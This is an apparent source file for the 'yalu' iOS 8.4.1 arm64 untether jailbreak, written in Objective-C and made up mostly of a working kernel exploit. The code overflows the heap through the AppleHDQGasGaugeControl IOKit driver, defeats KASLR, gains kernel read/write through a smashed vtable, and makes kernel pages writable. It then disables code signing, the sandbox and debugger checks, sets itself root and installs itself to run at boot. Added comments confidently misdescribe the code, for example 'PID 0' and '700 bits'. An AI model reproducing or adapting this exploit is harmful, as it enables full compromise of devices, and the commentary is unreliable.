#include "patchfinder_64.h"
#include <Foundation/Foundation.h>
#import "xnuexp.h"
#import <mach/mach_time.h>
#import <sys/syscall.h>
#import <sys/mount.h>
#include <copyfile.h>
#include <mach-o/dyld.h>
static char pad[0x10000];
typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
} oolmsg_t;
static void
extract(const char *filename, int do_extract, int flags);


static void deallocateFast(mach_port_t ref) {
    mach_port_deallocate(mach_task_self_, ref);
}
static char* copyoutDataFast(mach_port_t ref) {
    char msgs[sizeof(oolmsg_t)+0x2000];
    oolmsg_t *msg=(void*)&msgs[0];
    bzero(msg,sizeof(oolmsg_t)+0x2000);
    if(MACH_MSG_SUCCESS == mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG, 0, sizeof(oolmsg_t)+0x2000, ref, 0, MACH_PORT_NULL))
        return msg->desc.address;
    return NULL;
}
static char* copyoutDataFastLen(mach_port_t ref, mach_vm_size_t* sz) {
    char msgs[sizeof(oolmsg_t)+0x2000];
    oolmsg_t *msg=(void*)&msgs[0];
    bzero(msg,sizeof(oolmsg_t)+0x2000);
    if(MACH_MSG_SUCCESS == mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG, 0, sizeof(oolmsg_t)+0x2000, ref, 0, MACH_PORT_NULL)) {
        *sz = msg->desc.size;
        return msg->desc.address;
    }
    return NULL;
}

// Adds the untether files on boot.
static mach_port_t copyinDataFast(char* bytes, size_t size) {
    char msgs[sizeof(oolmsg_t)+0x2000];
    mach_port_t ref = 0;
    mach_port_t* msgp = &ref;
    oolmsg_t *msg=(void*)&msgs[0];
    if(!*msgp){
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, msgp);
        mach_port_insert_right(mach_task_self(), *msgp, *msgp, MACH_MSG_TYPE_MAKE_SEND);
    }
    bzero(msg,sizeof(oolmsg_t));
    
    // Begins to send the files to the device.
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_remote_port = *msgp;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_size = sizeof(oolmsg_t);
    msg->header.msgh_id = 1;
    msg->body.msgh_descriptor_count = 1;
    msg->desc.address = (void *)bytes;
    msg->desc.size = size;
    msg->desc.type = MACH_MSG_OOL_DESCRIPTOR;
    mach_msg_return_t m = mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
    return ref;
}

// Dumps the message received at boot in hex code.
void hexdump(unsigned char* ptr, size_t sz) {
    for (int i = 0; i < sz; i+=16) {
        NSLog(@"%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n", ptr[i], ptr[i+1], ptr[i+2], ptr[i+3], ptr[i+4], ptr[i+5], ptr[i+6], ptr[i+7], ptr[i+8], ptr[i+9], ptr[i+10], ptr[i+11], ptr[i+12], ptr[i+13], ptr[i+14], ptr[i+15]);
    }
}

// On boot up of device...
int main(int argc, char** argv) {
    __unused int pp = getppid();
    // Logs the result of the untethering process in a file.
    int fz = open("/var/mobile/Media/kjc_untether.log", O_APPEND|O_CREAT|O_RDWR);
    dup2(fz, STDOUT_FILENO);
    dup2(fz, STDERR_FILENO);
    
    // Waits until PID (process ID) 0 is executing -- that is, when the device is turning on.
    int p = fork();
    
    // This tests/forces the device state to be greater than 0 (for instance, 1 or 2) -- which means when it is on. (This has to be true in order for the rest of the code to operate.)
    assert(p >= 0);
    
    // If the device is on, then freeze PID 0 (startup) until the device has loaded all its files.
    if (p) {
        // Returns the result of the device state.
        return waitpid(p, 0, 0);
    }
    
    // Confirmation of device initiating in NSLog.
    NSLog(@"Smoke Britta Erry Day");
    NSLog(@"yalu for ios841 arm64 untether by ~qwertyoruiop[kjc]");
    NSLog(@"+420 swags @ windknown, comex, ih8sn0w, posixninja, _morpheus_, haifisch, jk9357, ttwj, kim jong un");
    NSLog(@"-420 swags @ south (fake) korea, saurik, britta");
    
    // Allow interaction with the rest of the device.
    sync();
    kern_return_t err;
    io_iterator_t iterator;
    
    // Here is where the fun happens...
    // Hooks onto HDQGasGaugeControl process (3rd exploit)
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AppleHDQGasGaugeControl"), &iterator);
    
    // Gets the next instance of the process.
    io_service_t gg = IOIteratorNext(iterator);
    
    // Initiates a connection with HDQGasGaugeControl.
    io_connect_t conn;
    
    // Patch the kernel with a modified PID 0 process.
    err = IOServiceOpen(gg, mach_task_self(), 0, &conn);
    
    // This forces the kernel to have been successfully exploited.
    assert(err == KERN_SUCCESS);
    
    // [??] This copies a 700-bit array buffer of processes to run on the device, in this case, the jailbreak.
    // Why 700? Will it not be able to handle more than that? Can't it be a power of 2 such as 512 or 1024 to comply with storage restrictions/requirements?
    mach_port_t spray[700];
    
    for (int i = 0; i < 700; i++) {
        // [??] copyInDataFast... hmm?
        // This seems redundant because it could gradually exploit one thing at a time in the kernel to fully gain root access.
        
        // 1024 - 0x58 = 700 bits.
        spray[i] = copyinDataFast(pad, 1024 - 0x58);
    }
    
    
    uint64_t inputScalar = 0;
    
    // This variable will be used later to overflow the data stack on the device.
    
    // 1024 + 0x100 (256) = 1,280 bits
    // Are the excess bits for the functioning of the regular device?
    
    // Maybe you could allocate 512 for the JB and 1024 for the device so there are no communication/data transfer/latency issues across iOS itself.
    char oflow_data[1024+0x100];
    
#define kern_uint_t uint64_t
    
#pragma pack(4)
    struct vm_map_copy {
        kern_uint_t type;
        kern_uint_t obj;
        kern_uint_t sz;
        kern_uint_t ptr;
        kern_uint_t kfree_size;
    } *oflow_msg = (struct vm_map_copy*) (&oflow_data[1024]);
    
    memset(&oflow_data[0], 0, 1024+0x100);
    for (int i = 0; i < 125; i++) {
        *(uint32_t *)&oflow_data[4 + (i*8)] = 1;
    }
    *(uint32_t *)&oflow_data[4+(120*8)] = 0xFFFFFFFF;  // indicate end
    
    oflow_msg->type = 3; // type
    oflow_msg->sz = 1024; // size
    oflow_msg->ptr = 0xFFFFFF4141414141;
    oflow_msg->kfree_size = 2048;
    
    copyoutDataFast(spray[500]);
    spray[500] = 0;
    copyoutDataFast(spray[515]);
    spray[515] = 0;
    copyoutDataFast(spray[530]);
    spray[530] = 0;
    copyoutDataFast(spray[560]);
    spray[560] = 0;
    
    IOConnectCallMethod(conn, 12, &inputScalar, 1, oflow_data, 1024 + 0x100, 0, 0, 0, 0);
    
    
    mach_port_t overlapping = 0;
    mach_port_t overlapped = 0;
    
    for (int i = 0; i < 700; i++) {
        if (spray[i]) {
            char* cpy = copyoutDataFast(spray[i]);
            if (cpy == NULL) {
                oflow_msg->kfree_size = 1024;
                overlapping  = copyinDataFast(&oflow_data[0x58], 2048 - 0x58);
                deallocateFast(spray[i]);
                spray[i] = 0;
                NSLog(@"Found overlapping object");
                goto outy;
            } else {
                mach_port_t tmp  = copyinDataFast(pad, 1024 - 0x58);
                deallocateFast(spray[i]);
                spray[i] = tmp;
            }
        }
    }
    assert(false);
outy:
    for (int i = 0; i < 700; i++) {
        if (spray[i]) {
            char* cpy = copyoutDataFast(spray[i]);
            if (cpy == NULL) {
                overlapped  = copyinDataFast(pad, 1024 - 0x58);
                NSLog(@"Found overlapped object");
            }
            deallocateFast(spray[i]);
            spray[i] = 0;
        }
    }
    assert(overlapped);
    char buf[4096];
    bzero(buf, 4096);
    
#define ReadToBuf() {\
char* cpy = copyoutDataFast(overlapping);\
mach_port_t tmp = copyinDataFast(cpy, 2048 - 0x58);\
memcpy(buf, cpy, 2048);\
deallocateFast(overlapping);\
overlapping = tmp;\
}
    
#define WriteFromBuf()  {\
char* cpy = copyoutDataFast(overlapping);\
mach_port_t tmp = copyinDataFast(buf, 2048 - 0x58);\
deallocateFast(overlapping);\
overlapping = tmp;\
}
    
#define SendOverlapped() {\
overlapped = copyinDataFast(pad, 1024 - 0x58);\
}
    
#define ReadOverlapped() copyoutDataFast(overlapped);
    
    
    ReadToBuf();
    ReadToBuf();
    
    uint64_t kernalloc = 0;
    struct vm_map_copy* vmcopy = (struct vm_map_copy*) &buf[1024 - 0x58];
    kernalloc = vmcopy->ptr - 0x58;
    vmcopy->kfree_size = 512;
    
    WriteFromBuf();
    ReadOverlapped();
    
    io_connect_t conn_;
    err = IOServiceOpen(gg, mach_task_self(), 0, &conn_);
    assert(err == KERN_SUCCESS);
    
    ReadToBuf();
    
    uint64_t vtptr = vmcopy->type;
    
    IOServiceClose(conn_);
    
    mach_timespec_t wt;
    wt.tv_nsec = 10000;
    wt.tv_sec = 1;
    
    for (int i = 0; i < 100; i++) {
        spray[i] = copyinDataFast(pad, 512 - 0x58);
        if (i % 10 == 0) {
            wt.tv_nsec = 10000;
            wt.tv_sec = 1;
            IOServiceWaitQuiet(gg, &wt);
        }
    }
    
    ReadToBuf();
    
    vmcopy->ptr = 0xFFFFFF4141414141;
    
    WriteFromBuf();
    
    for (int i = 0; i < 100; i++) {
        if (spray[i]) {
            char* cpy = copyoutDataFast(spray[i]);
            if (cpy == NULL) {
                overlapped  = copyinDataFast(pad, 512 - 0x58);
                NSLog(@"Found overlapped object again");
            }
            deallocateFast(spray[i]);
            spray[i] = 0;
        }
    }
    
    ReadToBuf();
    
    vmcopy->ptr = vtptr;
    vmcopy->sz = 4096;
    vmcopy->kfree_size = 1024;
    
    WriteFromBuf();
    
    uint64_t* vtdump = (uint64_t*) ReadOverlapped();
    SendOverlapped();
    
    uint64_t far = 0;
    
    for (int i = 0; i < 30; i++) {
        if (vtdump[i] > 0xffffff8000000000 && 0xffffff9000000000 > vtdump [i] && (far == 0 || vtdump[i] < far)) {
            far = vtdump[i];
        }
    }
    
    far -= 0xffffff8002002000;
    far &= ~0xFFFFF;
    far -= 0x300000;
    uint64_t kaslr_slide = far;
    NSLog(@"Partially dumping the kernel...");
    char* kern_dump = calloc(70, 0x10000);
    for (int i = 10; i < 20; i++) {
        ReadToBuf();
        vmcopy->sz = 0x10000;
        vmcopy->ptr = 0xffffff8002002000 + kaslr_slide + i*vmcopy->sz;
        WriteFromBuf();
        mach_vm_size_t sz = 0;
        char* data = copyoutDataFastLen(overlapped, &sz);
        SendOverlapped();
        
        if (!data) {
            continue;
        }
        memcpy(&kern_dump[i*vmcopy->sz], data, vmcopy->sz);
    }
    
    for (int i = 60; i < 70; i++) {
        ReadToBuf();
        vmcopy->sz = 0x10000;
        vmcopy->ptr = 0xffffff8002002000 + kaslr_slide + i*vmcopy->sz;
        WriteFromBuf();
        mach_vm_size_t sz = 0;
        char* data = copyoutDataFastLen(overlapped, &sz);
        SendOverlapped();
        
        if (!data) {
            continue;
        }
        memcpy(&kern_dump[i*vmcopy->sz], data, vmcopy->sz);
    }
    
    NSLog(@"Kernel dumped.");
    
    bzero(buf, 4096);
    ReadToBuf();
    vmcopy->kfree_size = 512;
    WriteFromBuf();
    ReadOverlapped();
    
    err = IOServiceOpen(gg, mach_task_self(), 0, &conn_);
    assert(err == KERN_SUCCESS);
    
    ReadToBuf();
    memcpy(&buf[2048], &buf[0], 2048);
    memcpy(&buf[0], vtdump, 2048);
    uint64_t *buftable = (uint64_t*) &buf[0];
    
    /*
     ffffff80042f789c	add	x0, x0, #232
     ffffff80042f78a0	ret
     */
    
    uint64_t add_x0_232 = (uint64_t)memmem(kern_dump, 70 * 0x10000, (&(char[]){0x00, 0xA0, 0x03, 0x91, 0xC0, 0x03, 0x5F, 0xD6}), 8);
    if (!add_x0_232) {
        NSLog(@"couldn't find gadget: add x0, x0, #232");
        sleep(1000);
    }
    add_x0_232 -= (uint64_t) kern_dump;
    
    /*
     ffffff80042f789c	add	x0, x0, #232
     ffffff80042f78a0	ret
     */
    
    uint64_t ldr_x0_x1_32 = (uint64_t)memmem(kern_dump, 70 * 0x10000, (&(char[]){0x20, 0x10, 0x40, 0xF9, 0xC0, 0x03, 0x5F, 0xD6}), 8);
    if (!ldr_x0_x1_32) {
        NSLog(@"couldn't find gadget: ldr x0 [x1, #32]");
        sleep(1000);
    }
    ldr_x0_x1_32 -= (uint64_t) kern_dump;
    
    NSLog(@"Gaining code exec..");
    
    buftable = (uint64_t*) &buf[1024 - 0x58 + 232];
    buftable[0] = 0x4141424243434444;
    buftable[0x25] = 0xffffff8002002000 + kaslr_slide + add_x0_232;
    memcpy(&buf[1024 - 0x58], &buf[2048 + 1024 - 0x58], 32);
    vmcopy->type = kernalloc - 1024 + 0x58;
    buftable[1] = 0xffffff8002002000 + kaslr_slide + ldr_x0_x1_32;
    WriteFromBuf();
    /* smashed vtable! */
    
#define WriteWhatWhere32(what, where) \
buftable[1] = 0xffffff8002002000 + kaslr_slide + str_w1_x2_ret;\
WriteFromBuf();\
IOConnectTrap5(conn_, 0, ((uint32_t)what), ((uint64_t)where), 0x1337133743434343, 0x1337133744444444, str_w1_x2_ret);
    
#define ReadWhere32(where, out) \
buftable[1] = 0xffffff8002002000 + kaslr_slide + ldr_x0_x1_32;\
WriteFromBuf();\
out = IOConnectTrap5(conn_, 0, ((uint64_t)where) - 32, 0x1337133742424242, 0x1337133743434343, 0x1337133744444444, 0x1337133745454545);
    
    
    NSLog(@"Doing a full kernel dump now..");
    
    uint8_t* real_kern_dump = malloc(0x10000 * 256);
    for (int i = 0; i < 0x10000 * 256; i+=4) {
        uint32_t read = IOConnectTrap5(conn_, 0, 0xffffff8002002000 + kaslr_slide + i - 32, 0x1337133742424242, 0x1337133743434343, 0x1337133744444444, 0x1337133745454545);
        *(uint32_t*) (&real_kern_dump[i]) = read;
    }
    
    
    NSLog(@"Done!");
    
    
    
    
    uint64_t invalidate_tlb = find_invalidate_tlb_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t flushcache = find_flush_dcache_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t str_w1_x2_ret = find_str_w1_x2_ret_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    
    uint64_t mount_common = find_mount_common_patch_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t cs_enforce = find_cs_enforcement_disable_amfi_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t vm_map_enter = find_vm_map_enter_patch_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t vm_map_protect = find_vm_map_protect_patch_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t tfp0 = find_tfp0_patch_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t get_r00t = find_setreuid_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t ichdb_1 = find_i_can_has_debugger_1_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t ichdb_2 = find_i_can_has_debugger_2_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t proc_enforce = find_proc_enforce_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t mapio = find_lwvm_mapio_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t sb_trace = find_sb_backtrace_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t pages[50];
    int page_cnt = 0;
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (get_r00t & (~0xFFF));
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (vm_map_enter & (~0xFFF));
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (vm_map_protect & (~0xFFF));
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (mount_common & (~0xFFF));
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (tfp0 & (~0xFFF));
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (cs_enforce & (~0xFFF));
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (proc_enforce & (~0xFFF));
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (ichdb_1 & (~0xFFF));
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (ichdb_2 & (~0xFFF));
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (mapio & (~0xFFF));
    pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (sb_trace & (~0xFFF));
    
    uint64_t kernel_pmap = find_pmap_location_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t pmap_store = *(uint64_t*)(&real_kern_dump[kernel_pmap]);
    uint64_t pde_base = *(uint64_t*)(&real_kern_dump[pmap_store - (0xffffff8002002000 + kaslr_slide)]);
    NSLog(@"str_w1_x2_ret: 0x%016llx", str_w1_x2_ret);
    NSLog(@"kernel_pmap: 0x%016llx", kernel_pmap);
    NSLog(@"pmap_store: 0x%016llx", pmap_store);
    NSLog(@"pde_base: 0x%016llx", pde_base);
    
    uint64_t _physAddr = find_gPhysAddr_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
    uint64_t gPhysBase = *(uint64_t*)(&real_kern_dump[_physAddr]);
    uint64_t gVirtBase = *(uint64_t*)(&real_kern_dump[_physAddr - 8]);
    
    NSLog(@"physAddr: 0x%016llx", _physAddr);
    NSLog(@"physBase: 0x%016llx", gPhysBase);
    NSLog(@"virtBase: 0x%016llx", gVirtBase);
    
    uint32_t kv = 0;
    
    ReadWhere32(kernalloc - 2048, kv);
    NSLog(@"kv: 0x%016llx", kv);
    
    WriteWhatWhere32(0x1337, kernalloc - 2048);
    
    ReadWhere32(kernalloc - 2048, kv);
    NSLog(@"kv: 0x%016llx", kv);
    
    // thanks @PanguTeam
    
    const uint64_t addr_start = 0xffffff8000000000; // 解析内核页表的起始地址（高25位为1，TTBR1_EL1设置决定）
    // 最多3层映射 level1的block是1G level2的block是2M page是4K
    // 首先读取stage1的值
    uint64_t level1_data = 0;
    uint32_t * hi_lo = &level1_data;
    
    ReadWhere32(pde_base, hi_lo[0]);
    ReadWhere32(pde_base+4, hi_lo[1]);
    
    // read level2 每项对应2M
    uint64_t level2_base = (level1_data & 0xfffffff000) - gPhysBase + gVirtBase;
    uint64_t level2_krnl = level2_base + (((0xffffff8002002000 + kaslr_slide - addr_start) >> 21) << 3);
    // 使用patch vtable表后的读接口，更为稳定
    uint64_t level2_data[15] = {0};
    
    NSLog(@"level2_base %llx level2_krnl %llx", level2_base, level2_krnl);
    
    hi_lo = &level2_data;
    for (int i = 0; i < sizeof(level2_data)/sizeof(uint32_t); i++) {
        ReadWhere32(level2_krnl+(i*4), hi_lo[i]);
    }
    
    // change kernel code page to RW !
    // 尝试修改前4个block
    for (int i = 0; i < 4; i++)
    {
        // 必须是block并且accese不是RW
        if ((level2_data[i] & 3) != 1)
            continue;
        if (((level2_data[i] >> 6) & 1) != 0 || ((level2_data[i] >> 7) & 1) != 0)
        {
            level2_data[i] &= 0xffffffffffffff3f;
            // 覆盖低4字节就够了
            NSLog(@"to patch block page table");
            WriteWhatWhere32(level2_data[i], level2_krnl + i*8);
        }
    }
    // 修改了可写属性的地址范围
    uint64_t rw_krnl_end = (((0xffffff8002002000 + kaslr_slide) >> 21) << 21) + 0x200000*3 - 1;
    
    // 改写页表
    for (int i = 0; i < page_cnt; i++)
    {
        uint64_t rw_page_base = pages[i];
        // if (rw_page_base <= rw_krnl_end)
        //     continue;
        
        // 首先检查level2对应的是table
        int idx = (int)(((rw_page_base - addr_start) >> 21) - (((0xffffff8002002000 + kaslr_slide) - addr_start) >> 21));
        if ((level2_data[idx] & 3) != 3)
            continue;
        // level3，每项对应4K页
        uint64_t level3_base = (level2_data[idx] & 0xfffffff000) - gPhysBase + gVirtBase;
        uint64_t level3_krnl = level3_base + (((rw_page_base & 0x1fffff) >> 12) << 3);
        
        NSLog(@"va: %llx idx: %d level2: %llx level3_base: %llx pte_krnl: %llx", rw_page_base, idx, level2_data[idx], level3_base, level3_krnl);
        
        // read pte
        uint64_t level3_data = 0;
        hi_lo = &level3_data;
        
        ReadWhere32(level3_krnl, hi_lo[0]);
        ReadWhere32(level3_krnl+4, hi_lo[1]);
        
        
        // 改为RW
        if (((level3_data >> 6) & 1) != 0 || ((level3_data >> 7) & 1) != 0)
        {
            level3_data &= 0xffffffffffffff3f;
            // 覆盖低4字节就够了
            NSLog(@"to patch page table");
            WriteWhatWhere32( (uint32_t)level3_data, level3_krnl);
        }
    }
    
    buftable[1] = 0xffffff8002002000 + kaslr_slide + invalidate_tlb;
    WriteFromBuf();
    IOConnectTrap1(conn_, 0, 0);
    
    buftable[1] = 0xffffff8002002000 + kaslr_slide + flushcache;
    WriteFromBuf();
    IOConnectTrap1(conn_, 0, 0);
    
    ReadWhere32((0xffffff8002002000 + kaslr_slide + vm_map_enter), kv);
    NSLog(@"kv: 0x%016llx", kv);
    ReadWhere32((0xffffff8002002000 + kaslr_slide + tfp0), kv);
    NSLog(@"kv: 0x%016llx", kv);
    
    WriteWhatWhere32(0xD503201F, (0xffffff8002002000 + kaslr_slide + (get_r00t)));
    WriteWhatWhere32(0xD503201F, (0xffffff8002002000 + kaslr_slide + (vm_map_protect)));
    WriteWhatWhere32(0xF10003DF, (0xffffff8002002000 + kaslr_slide + (vm_map_enter)));
    WriteWhatWhere32(0xD503201F, (0xffffff8002002000 + kaslr_slide + (tfp0)));
    WriteWhatWhere32(0xD503201F, (0xffffff8002002000 + kaslr_slide + (mount_common)));
    WriteWhatWhere32(0xD503201F, (0xffffff8002002000 + kaslr_slide + (sb_trace)));
    WriteWhatWhere32(0x14000005, (0xffffff8002002000 + kaslr_slide + (mapio)));
    WriteWhatWhere32(1, (0xffffff8002002000 + kaslr_slide + (cs_enforce)));
    WriteWhatWhere32(1, (0xffffff8002002000 + kaslr_slide + (ichdb_1)));
    WriteWhatWhere32(1, (0xffffff8002002000 + kaslr_slide + (ichdb_2)));
    WriteWhatWhere32(0, (0xffffff8002002000 + kaslr_slide + (proc_enforce)));
    
    ReadWhere32((0xffffff8002002000 + kaslr_slide + vm_map_enter), kv);
    NSLog(@"kv: 0x%016llx", kv);
    ReadWhere32((0xffffff8002002000 + kaslr_slide + tfp0), kv);
    NSLog(@"kv: 0x%016llx", kv);
    
    /*
     
     pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (vm_map_enter & (~0xFFF));
     pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (vm_map_protect & (~0xFFF));
     pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (tfp0 & (~0xFFF));
     pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (ichdb_1 & (~0xFFF));
     pages[page_cnt++] = 0xffffff8002002000 + kaslr_slide + (ichdb_2 & (~0xFFF));
     
     */
    
    buftable[1] = 0xffffff8002002000 + kaslr_slide + flushcache;
    WriteFromBuf();
    IOConnectTrap1(conn_, 0, 0);
    
    NSLog(@"uid: %d", getuid());
    
    setreuid(0, 0);
    setuid(0);
    
    NSLog(@"uid: %d", getuid());
    
    memcpy(&buf[0], &buf[2048], 2048);
    WriteFromBuf();
    
    ReadToBuf();
    
    IOServiceClose(conn_);
    
    wt.tv_nsec = 10000;
    wt.tv_sec = 1;
    
    for (int i = 0; i < 100; i++) {
        spray[i] = copyinDataFast(pad, 512 - 0x58);
        if (i % 10 == 0) {
            wt.tv_nsec = 10000;
            wt.tv_sec = 1;
            IOServiceWaitQuiet(gg, &wt);
            usleep(200);
        }
    }
    
    ReadToBuf();
    
    vmcopy->kfree_size = 1024;
    vmcopy->ptr = 0xFFFFFF4141414141;
    
    WriteFromBuf();
    
    for (int i = 0; i < 100; i++) {
        if (spray[i]) {
            char* cpy = copyoutDataFast(spray[i]);
            if (cpy == NULL) {
                overlapped  = copyinDataFast(pad, 1024 - 0x58);
                NSLog(@"Found overlapped object again");
            }
            deallocateFast(spray[i]);
            spray[i] = 0;
        }
    }
    
    NSLog(@"Cleaning the mess.. ");
    ReadToBuf();
    vmcopy->kfree_size = 0xFFFFFFF0;
    WriteFromBuf();
    
    ReadOverlapped();
    char* nm = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", 0x10000, &nm);
    
    NSLog(@"Remounting / as read/write %d %s", mntr, strerror(errno));
    struct stat sb;
    if (stat("/yalu", &sb) != 0) {
        NSLog(@"/yalu not found, dropping myself..");
        char name[1024];
        uint32_t sz = 1024;
        _NSGetExecutablePath(&name[0], &sz);
        int o = open(name, O_RDONLY);
        int f = open("/yalu", O_RDWR|O_CREAT|O_TRUNC);
        int r = fcopyfile(o, f, 0, COPYFILE_ALL);
        NSLog(@"%d %d %d", o, f, r);
    }
    if (stat("/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", &sb) == 0) {
        chmod("/var/mobile/Media/PhotoData/KimJongCracks/tar", 0777);

        NSLog(@"Installing loader.");
        chdir("/");
        
        NSLog(@"Beginning extraction.");
        int f = fork();
        
        // [??] There seems to be too much going on here. It should just run Cydia and its sub-processes and get it over with.
        
        // [??] Why is it already unzipping/uncompressing stuff? Shouldn't a smaller version of the process just load right onto the device?
        
        
        // CPU overflow problems and memory/process problems will probably happen if it's uncompressing a photo and a library while the phone is booting up.
        
        if (f == 0) {
            execl("/var/mobile/Media/PhotoData/KimJongCracks/tar", "tar", "xvf", "/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", 0);
            exit(0);
        }
        waitpid(f, 0, 0);

        NSLog(@"Done extracting.");
        
        // Code for running Cydia is below.
        
        // Executing on device startup? Hmm... seems a little complicated.
        // I think it should start with low-level processes so that the kernel and CPU doesn't get all mad at us...
        
        
        // Initiate the CPU here?
        
        /*
         this fucks shit up without an untether
        f = fork();
        if (f == 0) {
            execl("/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "install", 0);
            exit(0);
        }
        waitpid(f, 0, 0);
         */
        
        // [??] The above needs to be rewritten or moved... there seems to be some latency/communication issues.
        // The device hasn't even booted to the lock screen yet.
         
        f = fork();
        if (f == 0) {
            setreuid(501,501);
            execl("/usr/bin/uicache", "uicache", 0);
            exit(0);
        }
        
        waitpid(f, 0, 0);
        NSLog(@"Done installing loader.");
        
        unlink("/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar");
        
        // What is exactly being killed here?
        kill(pp, 9);
    }
    
    // And now, we are on the lockscreen.
    NSLog(@"alive?!");
    exit(0);
    
}

